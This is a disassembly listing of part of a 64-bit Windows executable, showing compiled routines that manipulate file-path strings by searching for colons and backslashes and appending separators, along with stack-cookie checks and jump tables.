   140004458:	cc                   	int3
   140004459:	cc                   	int3
   14000445a:	cc                   	int3
   14000445b:	cc                   	int3
   14000445c:	cc                   	int3
   14000445d:	cc                   	int3
   14000445e:	cc                   	int3
   14000445f:	cc                   	int3
   140004460:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004465:	57                   	push   %rdi
   140004466:	48 83 ec 20          	sub    $0x20,%rsp
   14000446a:	48 8b fa             	mov    %rdx,%rdi
   14000446d:	4d 8b c8             	mov    %r8,%r9
   140004470:	4c 8d 05 15 86 02 00 	lea    0x28615(%rip),%r8        # 0x14002ca8c
   140004477:	ba 00 10 00 00       	mov    $0x1000,%edx
   14000447c:	48 8b d9             	mov    %rcx,%rbx
   14000447f:	e8 fc d7 ff ff       	call   0x140001c80
   140004484:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004489:	7d 4d                	jge    0x1400044d8
   14000448b:	ba 3a 00 00 00       	mov    $0x3a,%edx
   140004490:	48 8b cb             	mov    %rbx,%rcx
   140004493:	e8 f8 8f 00 00       	call   0x14000d490
   140004498:	48 85 c0             	test   %rax,%rax
   14000449b:	74 3b                	je     0x1400044d8
   14000449d:	c6 00 00             	movb   $0x0,(%rax)
   1400044a0:	48 8b d7             	mov    %rdi,%rdx
   1400044a3:	48 ff c0             	inc    %rax
   1400044a6:	48 2b d0             	sub    %rax,%rdx
   1400044a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400044b0:	0f b6 08             	movzbl (%rax),%ecx
   1400044b3:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
   1400044b6:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400044ba:	84 c9                	test   %cl,%cl
   1400044bc:	75 f2                	jne    0x1400044b0
   1400044be:	38 0b                	cmp    %cl,(%rbx)
   1400044c0:	74 16                	je     0x1400044d8
   1400044c2:	0f b6 07             	movzbl (%rdi),%eax
   1400044c5:	f6 d8                	neg    %al
   1400044c7:	1b c0                	sbb    %eax,%eax
   1400044c9:	f7 d8                	neg    %eax
   1400044cb:	ff c8                	dec    %eax
   1400044cd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400044d2:	48 83 c4 20          	add    $0x20,%rsp
   1400044d6:	5f                   	pop    %rdi
   1400044d7:	c3                   	ret
   1400044d8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400044dd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400044e2:	48 83 c4 20          	add    $0x20,%rsp
   1400044e6:	5f                   	pop    %rdi
   1400044e7:	c3                   	ret
   1400044e8:	cc                   	int3
   1400044e9:	cc                   	int3
   1400044ea:	cc                   	int3
   1400044eb:	cc                   	int3
   1400044ec:	cc                   	int3
   1400044ed:	cc                   	int3
   1400044ee:	cc                   	int3
   1400044ef:	cc                   	int3
   1400044f0:	40 53                	rex push %rbx
   1400044f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400044f6:	4c 8b ca             	mov    %rdx,%r9
   1400044f9:	4c 8d 05 8c 85 02 00 	lea    0x2858c(%rip),%r8        # 0x14002ca8c
   140004500:	ba 00 10 00 00       	mov    $0x1000,%edx
   140004505:	48 8b d9             	mov    %rcx,%rbx
   140004508:	e8 73 d7 ff ff       	call   0x140001c80
   14000450d:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004512:	7c 08                	jl     0x14000451c
   140004514:	32 c0                	xor    %al,%al
   140004516:	48 83 c4 20          	add    $0x20,%rsp
   14000451a:	5b                   	pop    %rbx
   14000451b:	c3                   	ret
   14000451c:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140004523:	80 7c 03 01 00       	cmpb   $0x0,0x1(%rbx,%rax,1)
   140004528:	48 8d 40 01          	lea    0x1(%rax),%rax
   14000452c:	75 f5                	jne    0x140004523
   14000452e:	80 7c 18 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rbx,1)
   140004533:	75 05                	jne    0x14000453a
   140004535:	c6 44 18 ff 00       	movb   $0x0,-0x1(%rax,%rbx,1)
   14000453a:	ba 5c 00 00 00       	mov    $0x5c,%edx
   14000453f:	48 8b cb             	mov    %rbx,%rcx
   140004542:	e8 c5 8f 00 00       	call   0x14000d50c
   140004547:	48 85 c0             	test   %rax,%rax
   14000454a:	74 0b                	je     0x140004557
   14000454c:	c6 00 00             	movb   $0x0,(%rax)
   14000454f:	b0 01                	mov    $0x1,%al
   140004551:	48 83 c4 20          	add    $0x20,%rsp
   140004555:	5b                   	pop    %rbx
   140004556:	c3                   	ret
   140004557:	66 c7 03 2e 00       	movw   $0x2e,(%rbx)
   14000455c:	b0 01                	mov    $0x1,%al
   14000455e:	48 83 c4 20          	add    $0x20,%rsp
   140004562:	5b                   	pop    %rbx
   140004563:	c3                   	ret
   140004564:	cc                   	int3
   140004565:	cc                   	int3
   140004566:	cc                   	int3
   140004567:	cc                   	int3
   140004568:	cc                   	int3
   140004569:	cc                   	int3
   14000456a:	cc                   	int3
   14000456b:	cc                   	int3
   14000456c:	cc                   	int3
   14000456d:	cc                   	int3
   14000456e:	cc                   	int3
   14000456f:	cc                   	int3
   140004570:	b8 78 20 00 00       	mov    $0x2078,%eax
   140004575:	e8 56 83 00 00       	call   0x14000c8d0
   14000457a:	48 2b e0             	sub    %rax,%rsp
   14000457d:	48 8b 05 bc aa 03 00 	mov    0x3aabc(%rip),%rax        # 0x14003f040
   140004584:	48 33 c4             	xor    %rsp,%rax
   140004587:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   14000458e:	00 
   14000458f:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004595:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000459a:	e8 71 4e 00 00       	call   0x140009410
   14000459f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400045a4:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400045a9:	e8 ba 19 01 00       	call   0x140015f68
   1400045ae:	33 c9                	xor    %ecx,%ecx
   1400045b0:	85 c0                	test   %eax,%eax
   1400045b2:	0f 94 c1             	sete   %cl
   1400045b5:	8b c1                	mov    %ecx,%eax
   1400045b7:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   1400045be:	00 
   1400045bf:	48 33 cc             	xor    %rsp,%rcx
   1400045c2:	e8 09 80 00 00       	call   0x14000c5d0
   1400045c7:	48 81 c4 78 20 00 00 	add    $0x2078,%rsp
   1400045ce:	c3                   	ret
   1400045cf:	cc                   	int3
   1400045d0:	40 53                	rex push %rbx
   1400045d2:	b8 50 20 00 00       	mov    $0x2050,%eax
   1400045d7:	e8 f4 82 00 00       	call   0x14000c8d0
   1400045dc:	48 2b e0             	sub    %rax,%rsp
   1400045df:	48 8b 05 5a aa 03 00 	mov    0x3aa5a(%rip),%rax        # 0x14003f040
   1400045e6:	48 33 c4             	xor    %rsp,%rax
   1400045e9:	48 89 84 24 40 20 00 	mov    %rax,0x2040(%rsp)
   1400045f0:	00 
   1400045f1:	48 8b da             	mov    %rdx,%rbx
   1400045f4:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400045fa:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400045ff:	e8 0c 4e 00 00       	call   0x140009410
   140004604:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   14000460a:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000460f:	48 8b cb             	mov    %rbx,%rcx
   140004612:	e8 f9 4d 00 00       	call   0x140009410
   140004617:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000461c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004621:	e8 16 1a 01 00       	call   0x14001603c
   140004626:	48 8b 8c 24 40 20 00 	mov    0x2040(%rsp),%rcx
   14000462d:	00 
   14000462e:	48 33 cc             	xor    %rsp,%rcx
   140004631:	e8 9a 7f 00 00       	call   0x14000c5d0
   140004636:	48 81 c4 50 20 00 00 	add    $0x2050,%rsp
   14000463d:	5b                   	pop    %rbx
   14000463e:	c3                   	ret
   14000463f:	cc                   	int3
   140004640:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004645:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000464a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000464f:	57                   	push   %rdi
   140004650:	48 83 ec 20          	sub    $0x20,%rsp
   140004654:	49 8b f0             	mov    %r8,%rsi
   140004657:	4c 8b ca             	mov    %rdx,%r9
   14000465a:	bd 00 10 00 00       	mov    $0x1000,%ebp
   14000465f:	4c 8d 05 26 84 02 00 	lea    0x28426(%rip),%r8        # 0x14002ca8c
   140004666:	8b d5                	mov    %ebp,%edx
   140004668:	48 8b f9             	mov    %rcx,%rdi
   14000466b:	e8 10 d6 ff ff       	call   0x140001c80
   140004670:	48 63 c8             	movslq %eax,%rcx
   140004673:	48 81 f9 ff 0f 00 00 	cmp    $0xfff,%rcx
   14000467a:	73 66                	jae    0x1400046e2
   14000467c:	80 7c 39 ff 5c       	cmpb   $0x5c,-0x1(%rcx,%rdi,1)
   140004681:	74 0a                	je     0x14000468d
   140004683:	66 c7 04 39 5c 00    	movw   $0x5c,(%rcx,%rdi,1)
   140004689:	48 83 c1 02          	add    $0x2,%rcx
   14000468d:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   140004694:	48 2b e9             	sub    %rcx,%rbp
   140004697:	48 8b c3             	mov    %rbx,%rax
   14000469a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400046a0:	48 ff c0             	inc    %rax
   1400046a3:	80 3c 06 00          	cmpb   $0x0,(%rsi,%rax,1)
   1400046a7:	75 f7                	jne    0x1400046a0
   1400046a9:	48 3b c5             	cmp    %rbp,%rax
   1400046ac:	73 34                	jae    0x1400046e2
   1400046ae:	80 7c 30 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rsi,1)
   1400046b3:	4c 8b c5             	mov    %rbp,%r8
   1400046b6:	48 8b d6             	mov    %rsi,%rdx
   1400046b9:	48 8b cf             	mov    %rdi,%rcx
   1400046bc:	75 1a                	jne    0x1400046d8
   1400046be:	e8 ed 65 02 00       	call   0x14002acb0
   1400046c3:	80 7c 1f 01 00       	cmpb   $0x0,0x1(%rdi,%rbx,1)
   1400046c8:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   1400046cc:	75 f5                	jne    0x1400046c3
   1400046ce:	c6 44 3b ff 00       	movb   $0x0,-0x1(%rbx,%rdi,1)
   1400046d3:	48 8b c7             	mov    %rdi,%rax
   1400046d6:	eb 0c                	jmp    0x1400046e4
   1400046d8:	e8 d3 65 02 00       	call   0x14002acb0
   1400046dd:	48 8b c7             	mov    %rdi,%rax
   1400046e0:	eb 02                	jmp    0x1400046e4
   1400046e2:	33 c0                	xor    %eax,%eax
   1400046e4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400046e9:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400046ee:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400046f3:	48 83 c4 20          	add    $0x20,%rsp
   1400046f7:	5f                   	pop    %rdi
   1400046f8:	c3                   	ret
   1400046f9:	cc                   	int3
   1400046fa:	cc                   	int3
   1400046fb:	cc                   	int3
   1400046fc:	cc                   	int3
   1400046fd:	cc                   	int3
   1400046fe:	cc                   	int3
   1400046ff:	cc                   	int3
   140004700:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004705:	57                   	push   %rdi
   140004706:	b8 30 40 00 00       	mov    $0x4030,%eax
   14000470b:	e8 c0 81 00 00       	call   0x14000c8d0
   140004710:	48 2b e0             	sub    %rax,%rsp
   140004713:	48 8b 05 26 a9 03 00 	mov    0x3a926(%rip),%rax        # 0x14003f040
   14000471a:	48 33 c4             	xor    %rsp,%rax
   14000471d:	48 89 84 24 20 40 00 	mov    %rax,0x4020(%rsp)
   140004724:	00 
   140004725:	48 8b da             	mov    %rdx,%rbx
   140004728:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000472e:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004733:	48 8b f9             	mov    %rcx,%rdi
   140004736:	e8 d5 4c 00 00       	call   0x140009410
   14000473b:	48 85 c0             	test   %rax,%rax
   14000473e:	74 74                	je     0x1400047b4
   140004740:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004746:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   14000474d:	00 
   14000474e:	48 8b cb             	mov    %rbx,%rcx
   140004751:	e8 ba 4c 00 00       	call   0x140009410
   140004756:	48 85 c0             	test   %rax,%rax
   140004759:	74 59                	je     0x1400047b4
   14000475b:	45 33 c0             	xor    %r8d,%r8d
   14000475e:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004763:	44 39 05 96 a8 03 00 	cmp    %r8d,0x3a896(%rip)        # 0x14003f000
   14000476a:	48 8d 8c 24 20 20 00 	lea    0x2020(%rsp),%rcx
   140004771:	00 
   140004772:	b8 02 00 00 00       	mov    $0x2,%eax
   140004777:	44 0f 45 c0          	cmovne %eax,%r8d
   14000477b:	ff 15 6f 79 02 00    	call   *0x2796f(%rip)        # 0x14002c0f0
   140004781:	84 c0                	test   %al,%al
   140004783:	75 2b                	jne    0x1400047b0
   140004785:	83 3d 74 a8 03 00 00 	cmpl   $0x0,0x3a874(%rip)        # 0x14003f000
   14000478c:	74 26                	je     0x1400047b4
   14000478e:	ff 15 3c 79 02 00    	call   *0x2793c(%rip)        # 0x14002c0d0
   140004794:	83 f8 57             	cmp    $0x57,%eax
   140004797:	75 1b                	jne    0x1400047b4
   140004799:	48 8b d3             	mov    %rbx,%rdx
   14000479c:	c7 05 5a a8 03 00 00 	movl   $0x0,0x3a85a(%rip)        # 0x14003f000
   1400047a3:	00 00 00 
   1400047a6:	48 8b cf             	mov    %rdi,%rcx
   1400047a9:	e8 52 ff ff ff       	call   0x140004700
   1400047ae:	eb 09                	jmp    0x1400047b9
   1400047b0:	33 c0                	xor    %eax,%eax
   1400047b2:	eb 05                	jmp    0x1400047b9
   1400047b4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400047b9:	48 8b 8c 24 20 40 00 	mov    0x4020(%rsp),%rcx
   1400047c0:	00 
   1400047c1:	48 33 cc             	xor    %rsp,%rcx
   1400047c4:	e8 07 7e 00 00       	call   0x14000c5d0
   1400047c9:	48 8b 9c 24 50 40 00 	mov    0x4050(%rsp),%rbx
   1400047d0:	00 
   1400047d1:	48 81 c4 30 40 00 00 	add    $0x4030,%rsp
   1400047d8:	5f                   	pop    %rdi
   1400047d9:	c3                   	ret
   1400047da:	cc                   	int3
   1400047db:	cc                   	int3
   1400047dc:	cc                   	int3
   1400047dd:	cc                   	int3
   1400047de:	cc                   	int3
   1400047df:	cc                   	int3
   1400047e0:	40 53                	rex push %rbx
   1400047e2:	b8 40 20 00 00       	mov    $0x2040,%eax
   1400047e7:	e8 e4 80 00 00       	call   0x14000c8d0
   1400047ec:	48 2b e0             	sub    %rax,%rsp
   1400047ef:	48 8b 05 4a a8 03 00 	mov    0x3a84a(%rip),%rax        # 0x14003f040
   1400047f6:	48 33 c4             	xor    %rsp,%rax
   1400047f9:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   140004800:	00 
   140004801:	48 8b da             	mov    %rdx,%rbx
   140004804:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000480a:	48 8b d1             	mov    %rcx,%rdx
   14000480d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004812:	e8 81 26 01 00       	call   0x140016e98
   140004817:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000481c:	e8 67 31 01 00       	call   0x140017988
   140004821:	48 89 03             	mov    %rax,(%rbx)
   140004824:	48 f7 d8             	neg    %rax
   140004827:	1b c0                	sbb    %eax,%eax
   140004829:	f7 d8                	neg    %eax
   14000482b:	ff c8                	dec    %eax
   14000482d:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   140004834:	00 
   140004835:	48 33 cc             	xor    %rsp,%rcx
   140004838:	e8 93 7d 00 00       	call   0x14000c5d0
   14000483d:	48 81 c4 40 20 00 00 	add    $0x2040,%rsp
   140004844:	5b                   	pop    %rbx
   140004845:	c3                   	ret
   140004846:	cc                   	int3
   140004847:	cc                   	int3
   140004848:	cc                   	int3
   140004849:	cc                   	int3
   14000484a:	cc                   	int3
   14000484b:	cc                   	int3
   14000484c:	cc                   	int3
   14000484d:	cc                   	int3
   14000484e:	cc                   	int3
   14000484f:	cc                   	int3
   140004850:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004855:	55                   	push   %rbp
   140004856:	48 8b ec             	mov    %rsp,%rbp
   140004859:	48 83 ec 70          	sub    $0x70,%rsp
   14000485d:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004864:	49 8b d9             	mov    %r9,%rbx
   140004867:	4c 8b d9             	mov    %rcx,%r11
   14000486a:	44 8b 90 28 10 00 00 	mov    0x1028(%rax),%r10d
   140004871:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004878:	45 03 d2             	add    %r10d,%r10d
   14000487b:	44 0b d0             	or     %eax,%r10d
   14000487e:	41 81 c2 98 fd ff ff 	add    $0xfffffd98,%r10d
   140004885:	41 83 fa 0b          	cmp    $0xb,%r10d
   140004889:	77 7a                	ja     0x140004905
   14000488b:	48 8d 15 6e b7 ff ff 	lea    -0x4892(%rip),%rdx        # 0x140000000
   140004892:	49 63 c2             	movslq %r10d,%rax
   140004895:	8b 8c 82 18 49 00 00 	mov    0x4918(%rdx,%rax,4),%ecx
   14000489c:	48 03 ca             	add    %rdx,%rcx
   14000489f:	ff e1                	jmp    *%rcx
   1400048a1:	4d 63 c8             	movslq %r8d,%r9
   1400048a4:	4d 8d 43 58          	lea    0x58(%r11),%r8
   1400048a8:	48 8b 05 41 e5 03 00 	mov    0x3e541(%rip),%rax        # 0x140042df0
   1400048af:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400048b3:	49 8b d3             	mov    %r11,%rdx
   1400048b6:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400048bb:	ff 15 ff 7b 02 00    	call   *0x27bff(%rip)        # 0x14002c4c0
   1400048c1:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400048c5:	0f 10 00             	movups (%rax),%xmm0
   1400048c8:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400048cc:	48 8b 05 c5 e5 03 00 	mov    0x3e5c5(%rip),%rax        # 0x140042e98
   1400048d3:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400048d7:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400048db:	ff 15 df 7b 02 00    	call   *0x27bdf(%rip)        # 0x14002c4c0
   1400048e1:	f7 d8                	neg    %eax
   1400048e3:	1b c0                	sbb    %eax,%eax
   1400048e5:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400048ec:	00 
   1400048ed:	48 83 c4 70          	add    $0x70,%rsp
   1400048f1:	5d                   	pop    %rbp
   1400048f2:	c3                   	ret
   1400048f3:	4d 63 c8             	movslq %r8d,%r9
   1400048f6:	4d 8d 43 68          	lea    0x68(%r11),%r8
   1400048fa:	eb ac                	jmp    0x1400048a8
   1400048fc:	4d 63 c8             	movslq %r8d,%r9
   1400048ff:	4d 8d 43 78          	lea    0x78(%r11),%r8
   140004903:	eb a3                	jmp    0x1400048a8
   140004905:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   14000490c:	00 
   14000490d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004912:	48 83 c4 70          	add    $0x70,%rsp
   140004916:	5d                   	pop    %rbp
   140004917:	c3                   	ret
   140004918:	a1 48 00 00 05 49 00 	movabs 0xa100004905000048,%eax
   14000491f:	00 a1 
   140004921:	48 00 00             	rex.W add %al,(%rax)
   140004924:	05 49 00 00 f3       	add    $0xf3000049,%eax
   140004929:	48 00 00             	rex.W add %al,(%rax)
   14000492c:	05 49 00 00 fc       	add    $0xfc000049,%eax
   140004931:	48 00 00             	rex.W add %al,(%rax)
   140004934:	05 49 00 00 fc       	add    $0xfc000049,%eax
   140004939:	48 00 00             	rex.W add %al,(%rax)
   14000493c:	05 49 00 00 fc       	add    $0xfc000049,%eax
   140004941:	48 00 00             	rex.W add %al,(%rax)
   140004944:	fc                   	cld
   140004945:	48 00 00             	rex.W add %al,(%rax)
   140004948:	cc                   	int3
   140004949:	cc                   	int3
   14000494a:	cc                   	int3
   14000494b:	cc                   	int3
   14000494c:	cc                   	int3
   14000494d:	cc                   	int3
   14000494e:	cc                   	int3
   14000494f:	cc                   	int3
   140004950:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004955:	55                   	push   %rbp
   140004956:	48 8b ec             	mov    %rsp,%rbp
   140004959:	48 83 ec 50          	sub    $0x50,%rsp
   14000495d:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004964:	4d 8b d9             	mov    %r9,%r11
   140004967:	48 8b d9             	mov    %rcx,%rbx
   14000496a:	44 8b 90 28 10 00 00 	mov    0x1028(%rax),%r10d
   140004971:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004978:	45 03 d2             	add    %r10d,%r10d
   14000497b:	44 0b d0             	or     %eax,%r10d
   14000497e:	41 81 c2 98 fd ff ff 	add    $0xfffffd98,%r10d
   140004985:	41 83 fa 0b          	cmp    $0xb,%r10d
   140004989:	0f 87 1a 01 00 00    	ja     0x140004aa9
   14000498f:	48 8d 15 6a b6 ff ff 	lea    -0x4996(%rip),%rdx        # 0x140000000
   140004996:	49 63 c2             	movslq %r10d,%rax
   140004999:	8b 8c 82 bc 4a 00 00 	mov    0x4abc(%rdx,%rax,4),%ecx
   1400049a0:	48 03 ca             	add    %rdx,%rcx
   1400049a3:	ff e1                	jmp    *%rcx
   1400049a5:	48 8b 05 44 e4 03 00 	mov    0x3e444(%rip),%rax        # 0x140042df0
   1400049ac:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400049b0:	4d 63 c8             	movslq %r8d,%r9
   1400049b3:	48 8b d3             	mov    %rbx,%rdx
   1400049b6:	4c 8d 83 00 01 00 00 	lea    0x100(%rbx),%r8
   1400049bd:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   1400049c2:	ff 15 f8 7a 02 00    	call   *0x27af8(%rip)        # 0x14002c4c0
   1400049c8:	0f 10 00             	movups (%rax),%xmm0
   1400049cb:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400049cf:	c7 83 f8 00 00 00 01 	movl   $0x1,0xf8(%rbx)
   1400049d6:	00 00 00 
   1400049d9:	48 8b 05 b8 e4 03 00 	mov    0x3e4b8(%rip),%rax        # 0x140042e98
   1400049e0:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400049e4:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   1400049e8:	0f 29 4d f0          	movaps %xmm1,-0x10(%rbp)
   1400049ec:	ff 15 ce 7a 02 00    	call   *0x27ace(%rip)        # 0x14002c4c0
   1400049f2:	f7 d8                	neg    %eax
   1400049f4:	1b c0                	sbb    %eax,%eax
   1400049f6:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400049fb:	48 83 c4 50          	add    $0x50,%rsp
   1400049ff:	5d                   	pop    %rbp
   140004a00:	c3                   	ret
   140004a01:	48 8b 05 e8 e3 03 00 	mov    0x3e3e8(%rip),%rax        # 0x140042df0
   140004a08:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004a0c:	4d 63 c8             	movslq %r8d,%r9
   140004a0f:	48 8b d3             	mov    %rbx,%rdx
   140004a12:	4c 8d 83 20 01 00 00 	lea    0x120(%rbx),%r8
   140004a19:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   140004a1e:	ff 15 9c 7a 02 00    	call   *0x27a9c(%rip)        # 0x14002c4c0
   140004a24:	0f 10 00             	movups (%rax),%xmm0
   140004a27:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004a2b:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%rbx)
   140004a32:	00 00 00 
   140004a35:	eb a2                	jmp    0x1400049d9
   140004a37:	48 8b 05 b2 e3 03 00 	mov    0x3e3b2(%rip),%rax        # 0x140042df0
   140004a3e:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004a42:	4d 63 c8             	movslq %r8d,%r9
   140004a45:	48 8b d3             	mov    %rbx,%rdx
   140004a48:	4c 8d 83 38 01 00 00 	lea    0x138(%rbx),%r8
   140004a4f:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   140004a54:	ff 15 66 7a 02 00    	call   *0x27a66(%rip)        # 0x14002c4c0
   140004a5a:	0f 10 00             	movups (%rax),%xmm0
   140004a5d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004a61:	c7 83 30 01 00 00 01 	movl   $0x1,0x130(%rbx)
   140004a68:	00 00 00 
   140004a6b:	e9 69 ff ff ff       	jmp    0x1400049d9
   140004a70:	48 8b 05 79 e3 03 00 	mov    0x3e379(%rip),%rax        # 0x140042df0
   140004a77:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004a7b:	4d 63 c8             	movslq %r8d,%r9
   140004a7e:	48 8b d3             	mov    %rbx,%rdx
   140004a81:	4c 8d 83 40 01 00 00 	lea    0x140(%rbx),%r8
   140004a88:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   140004a8d:	ff 15 2d 7a 02 00    	call   *0x27a2d(%rip)        # 0x14002c4c0
   140004a93:	0f 10 00             	movups (%rax),%xmm0
   140004a96:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004a9a:	c7 83 38 01 00 00 01 	movl   $0x1,0x138(%rbx)
   140004aa1:	00 00 00 
   140004aa4:	e9 30 ff ff ff       	jmp    0x1400049d9
   140004aa9:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004aae:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004ab3:	48 83 c4 50          	add    $0x50,%rsp
   140004ab7:	5d                   	pop    %rbp
   140004ab8:	c3                   	ret
   140004ab9:	0f 1f 00             	nopl   (%rax)
   140004abc:	a5                   	movsl  (%rsi),(%rdi)
   140004abd:	49 00 00             	rex.WB add %al,(%r8)
   140004ac0:	a9 4a 00 00 a5       	test   $0xa500004a,%eax
   140004ac5:	49 00 00             	rex.WB add %al,(%r8)
   140004ac8:	a9 4a 00 00 01       	test   $0x100004a,%eax
   140004acd:	4a 00 00             	rex.WX add %al,(%rax)
   140004ad0:	a9 4a 00 00 37       	test   $0x3700004a,%eax
   140004ad5:	4a 00 00             	rex.WX add %al,(%rax)
   140004ad8:	a9 4a 00 00 37       	test   $0x3700004a,%eax
   140004add:	4a 00 00             	rex.WX add %al,(%rax)
   140004ae0:	a9 4a 00 00 70       	test   $0x7000004a,%eax
   140004ae5:	4a 00 00             	rex.WX add %al,(%rax)
   140004ae8:	70 4a                	jo     0x140004b34
   140004aea:	00 00                	add    %al,(%rax)
   140004aec:	cc                   	int3
   140004aed:	cc                   	int3
   140004aee:	cc                   	int3
   140004aef:	cc                   	int3
   140004af0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004af5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004afa:	57                   	push   %rdi
   140004afb:	48 83 ec 70          	sub    $0x70,%rsp
   140004aff:	49 8b c0             	mov    %r8,%rax
   140004b02:	48 8b fa             	mov    %rdx,%rdi
   140004b05:	48 8b f1             	mov    %rcx,%rsi
   140004b08:	45 33 c0             	xor    %r8d,%r8d
   140004b0b:	48 8b c8             	mov    %rax,%rcx
   140004b0e:	33 d2                	xor    %edx,%edx
   140004b10:	e8 fb 48 00 00       	call   0x140009410
   140004b15:	48 8b d8             	mov    %rax,%rbx
   140004b18:	48 85 c0             	test   %rax,%rax
   140004b1b:	75 17                	jne    0x140004b34
   140004b1d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004b22:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004b27:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004b2b:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140004b2f:	49 8b e3             	mov    %r11,%rsp
   140004b32:	5f                   	pop    %rdi
   140004b33:	c3                   	ret
   140004b34:	48 8b 05 ad e2 03 00 	mov    0x3e2ad(%rip),%rax        # 0x140042de8
   140004b3b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004b40:	4c 8b cb             	mov    %rbx,%r9
   140004b43:	4c 8b c7             	mov    %rdi,%r8
   140004b46:	48 8b d6             	mov    %rsi,%rdx
   140004b49:	ff 15 71 79 02 00    	call   *0x27971(%rip)        # 0x14002c4c0
   140004b4f:	48 8b cb             	mov    %rbx,%rcx
   140004b52:	0f 10 00             	movups (%rax),%xmm0
   140004b55:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004b5a:	0f 10 40 10          	movups 0x10(%rax),%xmm0
   140004b5e:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140004b63:	e8 98 06 01 00       	call   0x140015200
   140004b68:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   140004b6d:	48 8b 05 24 e3 03 00 	mov    0x3e324(%rip),%rax        # 0x140042e98
   140004b74:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b79:	0f 10 4c 24 50       	movups 0x50(%rsp),%xmm1
